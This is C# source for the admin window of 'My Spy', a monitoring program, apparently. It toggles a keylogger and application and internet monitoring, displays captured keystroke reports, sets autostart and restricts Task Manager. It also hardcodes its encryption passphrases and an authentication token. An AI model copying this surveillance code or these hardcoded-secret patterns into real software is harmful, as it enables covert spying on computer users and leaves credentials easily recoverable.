using CSharp_Weather;
using EncryptionLibrary;
using Microsoft.Win32;
using Saving;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.DataVisualization.Charting;

/*
 * 
 * Miroslav Murin
 * My Spy Administrator
 * -----------
 * Aplikacia pre administratorov
 * Sluzi pre zmenu nastaveni,hesla,emailu
 * a ziskavaniu sprav
 * -----------
 * 
 */

namespace My_Spy_Administrator
{
    public partial class Form1 : Form
    {

        static string PathMS = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy";

        Encryption encryption = new Encryption("kmAAnmAbVFSO9pgA2sy5X9lZhn5TulKi74FDZYZw");
        bool auth = false;
        private bool testing = false;
        Font font,fontb;
        int choosentab = 0;
        RegistryKey registry = Registry.LocalMachine.CreateSubKey("Software\\My_Spy");
        RegistryKey registrysettings = Registry.LocalMachine.CreateSubKey("Software\\My_Spy\\Settings");
        List<ApplicationInfo> appinfo = new List<ApplicationInfo>();
        PrivateFontCollection prfontc = new PrivateFontCollection();
        short ChoosedReports = 0;
        string KeyText = "",WeatherCity="";

        ManageApplication manage = new ManageApplication();


        #region Load - Nacitanie programu a formu

        public Form1()
        {
            SetLanguage();
            InitializeComponent();
        }

        private static readonly HttpClient client = new HttpClient();


        //***********  Form 1 Load  **************
        private void Form1_Load(object sender, EventArgs e)
        {

            if (testing)
                auth = true;
            if (!testing)
            {
                try
                {
                    //skontroluje ci existuje subor
                    if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/secure.pas"))
                    {
                        //testovanie autorizovania
                        SaveWriter save = new SaveWriter(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/secure.pas");
                        save.Load();
                        string token = encryption.DecryptString(save.GetItem("Token"), "BduIfxDmGPn5Xmk4DYqCHFkqg");
                        int time = int.Parse(encryption.DecryptString(save.GetItem("Time"), "f0Hy3j4tU5"));
                        //porovna token ci je spravny
                        if (token.Equals("M0F2s1Pwza"))
                        {
                            //skontroluje cas vytvorenia tokena
                            int curtime = (DateTime.Now.Hour * 60) + DateTime.Now.Minute;
                            if (curtime >= time && curtime < (time + 10))
                            {
                                //autorizovane
                                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/secure.pas");
                                auth = true;
                            }
                            else //cas nieje spravny
                            {
                                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/secure.pas");
                                MessageBox.Show(ResourcesFiles.ProgramStrings.Unauthorized);
                                Application.Exit();
                            }

                        }
                        else//token nieje pravy
                        {
                            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/secure.pas");
                            MessageBox.Show(ResourcesFiles.ProgramStrings.Unauthorized);
                            Application.Exit();
                        }
                    }
                    else //neexistuje subor
                    {
                        MessageBox.Show(ResourcesFiles.ProgramStrings.Unauthorized);
                        Application.Exit();
                    }
                }
                catch (Exception ex) //vyskytla sa chyba (napriklad token bol zly)
                {
                    Debug.WriteLine(ex);
                    MessageBox.Show(ResourcesFiles.ProgramStrings.Unauthorized);
                    Application.Exit();
                }


                //koniec testovania autorizovania
            }

            if (!auth)
            {
                MessageBox.Show(ResourcesFiles.ProgramStrings.Unauthorized);
                Application.Exit();
            }else
            {
                Enabled = true;
            }



            try
            {

                prfontc = new PrivateFontCollection();
                string pathtofont = Directory.GetParent(AppDomain.CurrentDomain.BaseDirectory).Parent.FullName + "/Resources/font.ttf";
                Debug.WriteLine(pathtofont);


                prfontc.AddFontFile(pathtofont);

                font = new Font(prfontc.Families[0], 14.0F);
                fontb = new Font(prfontc.Families[0], 16.0F);
                labeladminpanel.Font = new Font(prfontc.Families[0], 12);
            }
            catch(Exception ex)
            {
                Debug.WriteLine(ex);

                try
                {
                    font = new Font(label1.Font.FontFamily, 14.0F);
                    fontb = new Font(label1.Font.FontFamily, 16.0F);
                    labeladminpanel.Font = new Font(label1.Font.FontFamily, 12);
                }
                catch(Exception exe)
                {
                    Debug.WriteLine(exe);
                }
            }



            settingsTab.Appearance = TabAppearance.FlatButtons;
            settingsTab.ItemSize = new Size(0, 1);
            settingsTab.SizeMode = TabSizeMode.Fixed;

            menu1.Font = font;
            menu2.Font = font;
            menu3.Font = font;
            menu4.Font = font;
            menu5.Font = font;
            menu6.Font = font;
            menu7.Font = font;


            menu1.MouseEnter += menu_MouseEnter;
            menu1.MouseLeave += menu_MouseLeave;
            menu2.MouseEnter += menu_MouseEnter;
            menu2.MouseLeave += menu_MouseLeave;
            menu3.MouseEnter += menu_MouseEnter;
            menu3.MouseLeave += menu_MouseLeave;
            menu4.MouseEnter += menu_MouseEnter;
            menu4.MouseLeave += menu_MouseLeave;
            menu5.MouseEnter += menu_MouseEnter;
            menu5.MouseLeave += menu_MouseLeave;
            menu6.MouseEnter += menu_MouseEnter;
            menu6.MouseLeave += menu_MouseLeave;
            menu7.MouseEnter += menu_MouseEnter;
            menu7.MouseLeave += menu_MouseLeave;


            chartApplications.GetToolTipText += this.chartApplications_GetToolTipText;
            chartapptime.GetToolTipText += this.chartapptime_GetToolTipText;

            Header.Font = font;
            Header.Font = new Font(Header.Font.FontFamily, 18);


            labelmyspychatandroid.Font = fontb;
            labelmyspychatwindows.Font = fontb;
            labelMySpyChatinApp.Font = fontb;


            label4.Text = encryption.DecryptString((string)registry.GetValue("Email"), "BNKh3wQVQy");

            SetLanguageBox();

            onOffButtonMon.Checked = bool.Parse((string)registrysettings.GetValue("MonitorApplications","False"));
            onOffButtonKey.Checked = bool.Parse((string)registrysettings.GetValue("Keylogger", "False"));
            onOffButton3.Checked = bool.Parse((string)registrysettings.GetValue("Statistics", "True"));
            onOffButton4.Checked = bool.Parse((string)registrysettings.GetValue("InternetBlockList", "False"));
            onOffButton5.Checked = bool.Parse((string)registrysettings.GetValue("InternetBlockSocial", "False"));
            onOffButtonInternet.Checked = bool.Parse((string)registrysettings.GetValue("Internet", "False"));





            checkBoxWeb.Checked = bool.Parse((string)registrysettings.GetValue("Web", "False"));

            if(!registrysettings.GetValue("WebID","-").Equals("-"))
            {
                buttonWebLogin.Text = ResourcesFiles.ProgramStrings.Logout;
            }

            textBoxalias.Text = (string)registrysettings.GetValue("Alias", "PC");

            /*
            RegistryKey reg = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            reg.SetValue("My Spy", @"C:\Program Files (x86)\My Spy\My Spy\My Spy.exe");
            */


            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/location.dat"))
            {
                SaveWriter Loc = new SaveWriter(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/location.dat");
                Loc.Load();
                WeatherCity = Loc.GetItem("City");
                textBox6.Text = WeatherCity;
            }

            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/weathersettings.dat"))
            {
                SaveWriter set = new SaveWriter(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/weathersettings.dat");
                set.Load();
                onOffButtonUnit.Checked = set.GetItemBool("Unit");
            }


            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Block/ComputerTime.dat"))
            {
                SaveWriter set = new SaveWriter(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Block/ComputerTime.dat");
                set.Load();
                onOffButton1.Checked = set.GetItemBool("Enable");
                    dateTimePicker1.Value = DateTime.Parse(set.GetItem("Time"));
                    checkBox5.Checked = set.GetItemBool("Warning");
                    numericUpDown1.Value = set.GetItemInt("WarningTime");
                
            }


            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Block/BlockApps.dat"))
            {
                SaveWriter set = new SaveWriter(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Block/BlockApps.dat");
                set.Load();
                onOffButtonblock.Checked = set.GetItemBool("Enabled");
                for (int i = 0; i < set.GetItemInt("Count"); i++)
                {
                    listBoxblock.Items.Add(set.GetItem("Pr" + i));
                }
            }


            RegistryKey registryRun = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (registryRun.GetValue("My Spy") != null)
                checkBox1.Checked = true;

            
            //Thread na zrychlenie nacitania niektorych veci
            new Thread(() =>
            {
                try
                {
                    Thread.CurrentThread.IsBackground = true;

                    Process[] processes = Process.GetProcesses();
                    for (int i = 0; i < processes.Length; i++)
                        comboBoxBlock.Items.Add(processes[i].ProcessName);

                    if (File.Exists(PathMS + "/Stats/Today.sts"))
                    {
                        SaveWriter svs = new SaveWriter(PathMS + "/Stats/Today.sts");
                        svs.Load();
                        label36.Text = svs.GetItem("Date");
                        label37.Text = svs.GetItemInt("Hours").ToString("00") + ":" + svs.GetItemInt("Mins").ToString("00");
                        DataPoint chav = new DataPoint(0, (svs.GetItemInt("Hours") * 60) + svs.GetItemInt("Mins"));
                        chav.Label = ResourcesFiles.ProgramStrings.Today; ;
                        chav.ToolTip = ResourcesFiles.ProgramStrings.Today + ":  " + label37.Text;
                        chartaverage.Series[0].Points.Add(chav);
                        svs.Destroy();
                    }


                    if (File.Exists(PathMS + "/Stats/Month.sts"))
                    {
                        SaveWriter svs = new SaveWriter(PathMS + "/Stats/Month.sts");
                        svs.Load();
                        label42.Text = svs.GetItemInt("Hours").ToString("00") + ":" + svs.GetItemInt("Mins").ToString("00");
                        int avgh = ((svs.GetItemInt("Hours") * 60) + svs.GetItemInt("Mins")) / svs.GetItemInt("Divide");
                        int hour = (int)Math.Floor((decimal)(avgh / 60));
                        int minutes = (avgh - (hour * 60));
                        label44.Text = hour.ToString("00") + ":" + minutes.ToString("00");

                        DataPoint chav = new DataPoint(0, avgh);
                        chav.Label = ResourcesFiles.ProgramStrings.Month; ;
                        chav.ToolTip = ResourcesFiles.ProgramStrings.Month + " " + ResourcesFiles.ProgramStrings.Average + ":  " + label44.Text;
                        chartaverage.Series[0].Points.Add(chav);

                        chav.Label = ResourcesFiles.ProgramStrings.ThisMonth; 
                        chav.ToolTip = ResourcesFiles.ProgramStrings.ThisMonth + " " + ResourcesFiles.ProgramStrings.Average + ":  " + label44.Text;
                        chartmonthsaverage.Series[0].Points.Add(chav);

                        svs.Destroy();
                    }


                    if (File.Exists(PathMS + "/Stats/MonthOld.sts"))
                    {
                        SaveWriter svs = new SaveWriter(PathMS + "/Stats/MonthOld.sts");
                        svs.Load();
                        label53.Text = svs.GetItemInt("Hours").ToString("00") + ":" + svs.GetItemInt("Mins").ToString("00");
                        int avgh = ((svs.GetItemInt("Hours") * 60) + svs.GetItemInt("Mins")) / svs.GetItemInt("Divide");
                        int hour = (int)Math.Floor((decimal)(avgh / 60));
                        int minutes = (avgh - (hour * 60));
                        label51.Text = hour.ToString("00") + ":" + minutes.ToString("00");

                        DataPoint chav = new DataPoint(1, avgh);
                        chav.Label = ResourcesFiles.ProgramStrings.PreviousMonth;
                        chav.ToolTip = ResourcesFiles.ProgramStrings.PreviousMonth + " " + ResourcesFiles.ProgramStrings.Average + ":  " + label51.Text;
                        chartmonthsaverage.Series[0].Points.Add(chav);

                        svs.Destroy();
                    }

                    if (File.Exists(PathMS + "/Stats/MonthGraph.sts"))
                    {
                        SaveWriter svs = new SaveWriter(PathMS + "/Stats/MonthGraph.sts");
                        svs.Load();

                        int hour = 0;
                        int minutes = 0;
                        for (int i = 1; i <= svs.GetItemInt("Count"); i++)
                        {
                            DataPoint point = new DataPoint();
                            point.SetValueXY(svs.GetItemInt("Day" + i), svs.GetItemInt("Value" + i));
                            hour = (int)Math.Floor((decimal)(svs.GetItemInt("Value" + i) / 60));
                            minutes = (svs.GetItemInt("Value" + i) - (hour * 60));
                            point.ToolTip = svs.GetItem("Day" + i) + " - " + hour.ToString("00") + ":" + minutes.ToString("00");
                            chartMonth.Series[0].Points.Add(point);
                        }

                        svs.Destroy();
                    }


                    if (File.Exists(PathMS + "/Stats/AllTime.sts"))
                    {
                        SaveWriter svs = new SaveWriter(PathMS + "/Stats/AllTime.sts");
                        svs.Load();
                        int avgh = ((svs.GetItemInt("Hours") * 60) + svs.GetItemInt("Mins")) / svs.GetItemInt("Divide");
                        int hour = (int)Math.Floor((decimal)(avgh / 60));
                        int minutes = (avgh - (hour * 60));
                        label46.Text = hour.ToString("00") + ":" + minutes.ToString("00");

                        DataPoint chav = new DataPoint(0, avgh);
                        chav.Label = ResourcesFiles.ProgramStrings.AllTime; ;
                        chav.ToolTip = ResourcesFiles.ProgramStrings.AllTime + " " + ResourcesFiles.ProgramStrings.Average + ":  " + label46.Text;
                        chartaverage.Series[0].Points.Add(chav);

                        svs.Destroy();
                    }



                    if (NetworkInterface.GetIsNetworkAvailable())
                    {

                        long BSent = 0,BRec=0;

                        NetworkInterface[] interfaces
                            = NetworkInterface.GetAllNetworkInterfaces();

                        foreach (NetworkInterface ni in interfaces)
                        {
                            /*
                            Console.WriteLine(ni.Description);
                            Console.WriteLine("    Bytes Sent: " + ni.GetIPv4Statistics().BytesSent);
                            Console.WriteLine("    Bytes Received: " + ni.GetIPv4Statistics().BytesReceived);
                            */
                            BSent += ni.GetIPv4Statistics().BytesSent;
                            BRec += ni.GetIPv4Statistics().BytesReceived;
                        }

                        //Debug.WriteLine(BSent+"   Rec:"+BRec);
                        DataPoint point = new DataPoint(0, HelpClass.BytesToMegabytes(BSent));
                        point.ToolTip = ResourcesFiles.ProgramStrings.Sent+": "+ HelpClass.BytesToMegabytes(BSent)+" MB";
                        point.Label = ResourcesFiles.ProgramStrings.Sent;
                        chartnetwork.Series[0].Points.Add(point);


                        point = new DataPoint(0, HelpClass.BytesToMegabytes(BRec));
                        point.ToolTip = ResourcesFiles.ProgramStrings.Received + ": " + HelpClass.BytesToMegabytes(BRec) + " MB";
                        point.Label = ResourcesFiles.ProgramStrings.Received;
                        chartnetwork.Series[0].Points.Add(point);


                        labelReceived.Text = HelpClass.BytesToMegabytes(BRec) + " MB";
                        labelSent.Text = HelpClass.BytesToMegabytes(BSent) + " MB";
                    }
                }catch(Exception ex)
                {
                    Debug.WriteLine(""+ex);
                }

            }).Start();
            //koniec threadu


            if (File.Exists(PathMS + "/Settings/chat.dat"))
            {
                buttonlogoutchat.Visible = true;
                buttonlogintochat.Visible = false;
            }


            if (File.Exists( PathMS + "/Block/BlockWebsites.dat"))
            {
                SaveWriter set = new SaveWriter(PathMS + "/Block/BlockWebsites.dat");
                set.Load();
                for (int i = 0; i < set.GetItemInt("Count"); i++)
                {
                    listBoxBlockWebsites.Items.Add(set.GetItem("Website" + i));
                }
            }

        }
        //-------------  form1_load  -----------------


        #endregion

        #region Language - Praca z nastavovanim jazyka


        void SetLanguageBox()
        {
            string currentUI = Thread.CurrentThread.CurrentUICulture.Name;
            if (currentUI.Equals("sk-SK"))
            {
                comboBox1.SelectedIndex = 1;
            }
            else
            {
                comboBox1.SelectedIndex = 0;
            }
        }


        void SetLanguage()
        {
            try
            {
                string Lang = (string)registry.GetValue("Language");
                Debug.WriteLine("Language:" + Lang);
                if (!string.IsNullOrEmpty(Lang))
                {
                    Thread.CurrentThread.CurrentUICulture = CultureInfo.GetCultureInfo(Lang);
                }
            }
            catch(Exception e)
            {
                Debug.WriteLine(e);
            }
        }
        #endregion

        #region MENU - Funkcie na pracu z menu

        private void menu_MouseLeave(object sender, EventArgs e)
        {
            try
            {
                Label lab = (Label)sender;
                lab.Font = font;
                //font;
                //lab.Font = new Font(font.FontFamily, 14);
            }
            catch(Exception ex)
            {
                Debug.WriteLine(ex);
            }

        }

        private void menu_MouseEnter(object sender, EventArgs e)
        {
            try
            {
                Label lab = (Label)sender;
                lab.Font = fontb; 
                // fontb;
                // lab.Font = new Font(font.FontFamily, 16);
            }
            catch(Exception ex)
            {
                Debug.WriteLine(ex);
            }

        }


        private void menu1_Click(object sender, EventArgs e)
        {
            ChangeTab(0,0, GetTextFromLabel(0));
        }

        private void menu2_Click(object sender, EventArgs e)
        {
            ChangeTab(1,1, GetTextFromLabel(1));
        }

        private void menu3_Click(object sender, EventArgs e)
        {
            ChangeTab(2, 7, GetTextFromLabel(2));
        }

        private void menu4_Click(object sender, EventArgs e)
        {
            ChangeTab(3, 8, GetTextFromLabel(3));
        }

        private void menu5_Click(object sender, EventArgs e)
        {
            ChangeTab(4, 9, GetTextFromLabel(4));
        }


        private void menu6_Click(object sender, EventArgs e)
        {
            ChangeTab(5, 11, GetTextFromLabel(5));
        }

        private void menu7_Click(object sender, EventArgs e)
        {
            ChangeTab(6, 12, GetTextFromLabel(6));
        }



        //prepne tab bez zmeny oznacenia menu
        void ChangeOnlyTab(short TabIndex, string HeaderText)
        {
            settingsTab.SelectedIndex = TabIndex;
            Header.Text = HeaderText;
        }


        //prepne tab aj zmenou oznacenia menu
        void ChangeTab(short Changeto, short TabIndex, string HeaderText)
        {
            try
            {
                if (choosentab != Changeto)
                {
                    settingsTab.SelectedIndex = TabIndex;
                    Label labn = GetMenuTab(Changeto);
                    labn.BackColor = Color.FromArgb(36, 51, 65);
                    labn.ForeColor = Color.FromArgb(243, 156, 18);
                    if (choosentab > -1)
                    {
                        Label labold = GetMenuTab(choosentab);
                        labold.BackColor = Color.Transparent;
                        labold.ForeColor = Color.White;
                    }
                    choosentab = Changeto;
                    Header.Text = HeaderText;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("" + ex);
            }

        }

        //vypne oznacenie aktivneho vyberu v menu
        void RemoveSelectedTabFocus()
        {
            Label labold = GetMenuTab(choosentab);
            labold.BackColor = Color.Transparent;
            labold.ForeColor = Color.White;
            choosentab = -1;
        }

        Label GetMenuTab(int ID)
        {
            switch (ID)
            {
                case 0:
                    return menu1;
                case 1:
                    return menu2;
                case 2:
                    return menu3;
                case 3:
                    return menu4;
                case 4:
                    return menu5;
                case 5:
                    return menu6;
                case 6:
                    return menu7;
                default:
                    return menu1;
            }
        }



        string GetTextFromLabel(int ID)
        {
            return GetMenuTab(ID).Text;
        }


        #endregion

        #region Tab1 - zmena hesla, emailu, pocasie, nastavenia

        //do zmeny hesla
        private void button1_Click(object sender, EventArgs e)
        {
            ChangeOnlyTab(2,label9.Text);
            RemoveSelectedTabFocus();
        }


        //do zmeny emailu
        private void button2_Click(object sender, EventArgs e)
        {
            ChangeOnlyTab(3, label10.Text);
            RemoveSelectedTabFocus();
        }


        //zmenit jazyk
        private void button5_Click(object sender, EventArgs e)
        {
            string lang = "en-US";
            if (comboBox1.SelectedIndex == 1)
            {
                lang = "sk-SK";
            }
            else
            {
                lang = "en-US";
            }

            registry.SetValue("Language", lang);

            MessageBox.Show(ResourcesFiles.ProgramStrings.LanguageChangedBody, ResourcesFiles.ProgramStrings.LanguageChanged);
        }


        private void buttonRepairProgram_Click(object sender, EventArgs e)
        {
            manage.RestartApplication(PathMS);
        }



        //***** button weather save ******
        private void buttonweathersave_Click(object sender, EventArgs e)
        {
            try
            {
                bool showw = bool.Parse(HelpClass.GETHtml("http://myspy.diodegames.eu/ShowWeather.txt"));
                if (showw)
                {
                    bool change = false;
                    if (!textBox6.Text.Equals(WeatherCity))
                    {
                        if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/location.dat"))
                        {
                            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/location.dat");
                        }

                        CityLocator city = new CityLocator();
                        city.GetGeoCoordByCityNameEmail(textBox6.Text, "miro382@centrum.sk");
                        SaveWriter Loc = new SaveWriter(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/location.dat");
                        Loc.AddItem("City", city.PlaceDisplayName);
                        Loc.AddItem("Latitude", city.Latitude);
                        Loc.AddItem("Longtitude", city.Longtitude);
                        Loc.Save();

                        textBox6.Text = city.PlaceDisplayName;
                        change = true;
                    }

                    if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/weathersettings.dat"))
                    {
                        File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/weathersettings.dat");
                    }

                    SaveWriter wsave = new SaveWriter(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/weathersettings.dat");
                    wsave.AddItem("Unit", onOffButtonUnit.Checked);
                    wsave.Save();

                    if (change)
                    {
                        if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/weather.dat"))
                        {
                            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/weather.dat");
                        }

                        if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/weathericon.dat"))
                        {
                            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/Temp/weathericon.dat");
                        }

                    }
                }

            }
            catch (Exception ex)
            {
                Debug.WriteLine("" + ex);
            }
        }//----- button weather save -----


        private void buttonlogintochat_Click(object sender, EventArgs e)
        {
            Process.Start(AppDomain.CurrentDomain.BaseDirectory + "/Chat.exe");
        }

        private void buttonlogoutchat_Click(object sender, EventArgs e)
        {
            File.Delete(PathMS + "/Settings/chat.dat");
            buttonlogoutchat.Visible = false;
            buttonlogintochat.Visible = true;
        }


        private void buttonsavesettings_Click(object sender, EventArgs e)
        {
            RegistryKey registryRun = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            string Pathr = Application.ExecutablePath;
            Pathr = Pathr.Replace("Apps\\"+Path.GetFileName(Application.ExecutablePath),"");
            Pathr += "My Spy.exe";
            Debug.WriteLine(Pathr);

            if (checkBox1.Checked)
            {
                registryRun.SetValue("My Spy", Pathr);
            }
            else
            {
                if(registryRun.GetValue("My Spy")!=null)
                registryRun.DeleteValue("My Spy");
            }

            manage.SetTaskManager(checkBox2.Checked);

            if(textBoxalias.Text.Length>1)
            {
                registrysettings.SetValue("Alias", textBoxalias.Text);
            }else
            {
                textBoxalias.Text = "PC";
            }

            // registrysettings.SetValue("Start")
        }

        #endregion

        #region Tab2 - Monitorovanie -> nastavenia, zapnutie/vypnutie

        private void buttonSaveMonitor_Click(object sender, EventArgs e)
        {
            registrysettings.SetValue("MonitorApplications", onOffButtonMon.Checked);
            registrysettings.SetValue("Keylogger", onOffButtonKey.Checked);

            HelpClass.RestartService("My Spy", 10);
        }

        private void buttonAppReport_Click(object sender, EventArgs e)
        {
            ChoosedReports = 0;
            RepAddToListBox(0);
            ChangeOnlyTab(4, label14.Text);
            RemoveSelectedTabFocus();
        }


        private void buttonKeyReport_Click(object sender, EventArgs e)
        {
            ChoosedReports = 1;
            RepAddToListBox(1);
            ChangeOnlyTab(4, label14.Text);
            RemoveSelectedTabFocus();
        }

        #endregion

        #region Tab3, Tab4 - Zmena hesla, emailu

        private void imageButton2_Click(object sender, EventArgs e)
        {
            ChangeTab(0, 0, GetTextFromLabel(0));
        }

        private void imageButton3_Click(object sender, EventArgs e)
        {
            ChangeTab(0, 0, GetTextFromLabel(0));
        }


        //zmena hesla
        private void button3_Click(object sender, EventArgs e)
        {
            if (encryption.DecryptString((string)registry.GetValue("Properties"), "2pqB7l4eRM6nHaZPtetkkHePguacGTvrMhvnE4fy").Equals(textBox1.Text))
            {
                if (textBox2.Text.Equals(textBox3.Text))
                {
                    HelpClass.SendNotification(ResourcesFiles.ProgramStrings.PasswordChanged, encryption.DecryptString((string)registry.GetValue("Email"), "BNKh3wQVQy"));
                    registry.SetValue("Properties", encryption.EncryptString(textBox2.Text, "2pqB7l4eRM6nHaZPtetkkHePguacGTvrMhvnE4fy"));
                    textBox2.Text = "";
                    textBox3.Text = "";
                    textBox1.Text = "";
                    MessageBox.Show(ResourcesFiles.ProgramStrings.PassChange, ResourcesFiles.ProgramStrings.PassChangeHeader);
                }
                else
                {
                    MessageBox.Show(ResourcesFiles.ProgramStrings.PasswordsNotEqual, ResourcesFiles.ProgramStrings.Error);
                }
            }
            else
            {
                MessageBox.Show(ResourcesFiles.ProgramStrings.BadCurPassword, ResourcesFiles.ProgramStrings.Error);
            }
        }


        //zmen email
        private void button4_Click(object sender, EventArgs e)
        {

            if (encryption.DecryptString((string)registry.GetValue("Properties"), "2pqB7l4eRM6nHaZPtetkkHePguacGTvrMhvnE4fy").Equals(textBox5.Text))
            {
                if (HelpClass.IsValidEmail(textBox4.Text))
                {
                    HelpClass.SendNotification(ResourcesFiles.ProgramStrings.Emailnotify, encryption.DecryptString((string)registry.GetValue("Email"), "BNKh3wQVQy"));
                    HelpClass.SendNotification(ResourcesFiles.ProgramStrings.Emailnotify, textBox4.Text);
                    registry.SetValue("Email", encryption.EncryptString(textBox4.Text, "BNKh3wQVQy"));
                    label4.Text = textBox4.Text;
                    textBox5.Text = "";
                    textBox4.Text = "";
                    MessageBox.Show(ResourcesFiles.ProgramStrings.EmailChanged, ResourcesFiles.ProgramStrings.EmailChangedHeader);
                }
                else
                {
                    MessageBox.Show(ResourcesFiles.ProgramStrings.BadEmail, ResourcesFiles.ProgramStrings.Error);
                }
            }
            else
            {
                MessageBox.Show(ResourcesFiles.ProgramStrings.BadPassword, ResourcesFiles.ProgramStrings.Error);
            }

        }

        #endregion

        #region Tab5 - Vyber reportu

        private void imageButton4_Click(object sender, EventArgs e)
        {
            ChangeTab(1, 1, GetTextFromLabel(1));
        }


        //choose selected
        private void buttonChooseselected_Click(object sender, EventArgs e)
        {
            try
            {
                if (listBox1.SelectedIndex > -1)
                {

                    //*** Application reports ***
                    if (ChoosedReports == 0)
                    {
                        appinfo = HelpClass.LoadAppMonitoring("" + listBox1.Items[listBox1.SelectedIndex]);
                        label17.Text = "" + listBox1.Items[listBox1.SelectedIndex];
                        label21.Text = HelpClass.PCHour + ":" + HelpClass.PCMin.ToString("D2");
                        ChangeOnlyTab(5, label16.Text);
                        RemoveSelectedTabFocus();

                        float alltime = ((HelpClass.PCHour * 60) + HelpClass.PCMin);
                        int c = 0;
                        foreach (ApplicationInfo info in appinfo)
                        {

                            listBoxApp.Items.Add(info.ApplicationName + "   [" + info.ExecutableName + "]");
                            listBoxAppTime.Items.Add(info.GetHours() + ":" + info.GetMinutes().ToString("D2")); //info.GetHours()+":"+info.GetMinutes()
                                                                                                                //chartApplications.Series.Insert(0, info.ExecutableName);

                            int time = ((info.GetHours() * 60) + info.GetMinutes());
                            DataPoint data = new DataPoint(c, time);
                            data.LegendText = info.ApplicationName;
                            chartApplications.Series[0].Points.Add(data);


                            if (chartapptime.Series.IsUniqueName(info.ApplicationName))
                                chartapptime.Series.Insert(0, new Series(info.ApplicationName));
                            else
                                chartapptime.Series.Insert(0, new Series(info.ApplicationName + "   [" + info.ExecutableName + "]"));

                            float timper = (int)((time / alltime) * 100);
                            if (timper > 100)
                                timper = 100;

                            chartapptime.Series[0].Points.AddXY(c, timper);
                            chartapptime.Series[0].IsValueShownAsLabel = true;
                            c++;
                        }//--- Application reports -----
                    }//*** Keylogger reports ***
                    else if (ChoosedReports == 1)
                    {

                        label27.Text = "" + listBox1.Items[listBox1.SelectedIndex];
                        using (StreamReader reader = new StreamReader(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                            "/My Spy/MonitoringReports/Key/" + listBox1.Items[listBox1.SelectedIndex] + ".dat"))
                        {
                            KeyText = reader.ReadToEnd();
                        }
                        richTextBoxKeyText.Text = KeyText;
                        ChangeOnlyTab(6, label26.Text);
                    }
                    //--- Keylogger reports ---
                    //*** Internet reports ***
                    else if (ChoosedReports == 2)
                    {

                        label63.Text = "" + listBox1.Items[listBox1.SelectedIndex];
                        using (StreamReader reader = new StreamReader(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                            "/My Spy/MonitoringReports/Internet/" + listBox1.Items[listBox1.SelectedIndex] + ".dat"))
                        {
                            richTextBox1.Text = reader.ReadToEnd(); ;
                        }
                        ChangeOnlyTab(10, label62.Text);
                    }
                    //--- Internet reports ---

                }//listBox1.SelectedIndex > -1
            }
            catch (Exception ex)
            {
                Debug.WriteLine("" + ex);
            }
        }


        //remove selected
        private void button7_Click(object sender, EventArgs e)
        {
            try
            {
                if (listBox1.SelectedIndex > -1)
                {
                    if (ChoosedReports == 0)
                    {
                        File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                            "/My Spy/MonitoringReports/App/" + listBox1.Items[listBox1.SelectedIndex] + ".apprep");
                        listBox1.Items.RemoveAt(listBox1.SelectedIndex);
                    }
                    else if (ChoosedReports == 1)
                    {
                        File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                            "/My Spy/MonitoringReports/Key/" + listBox1.Items[listBox1.SelectedIndex] + ".dat");
                        listBox1.Items.RemoveAt(listBox1.SelectedIndex);
                    }
                    else if (ChoosedReports == 2)
                    {
                        File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                            "/My Spy/MonitoringReports/Internet/" + listBox1.Items[listBox1.SelectedIndex] + ".dat");
                        listBox1.Items.RemoveAt(listBox1.SelectedIndex);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("" + ex);
            }
        }

        #endregion

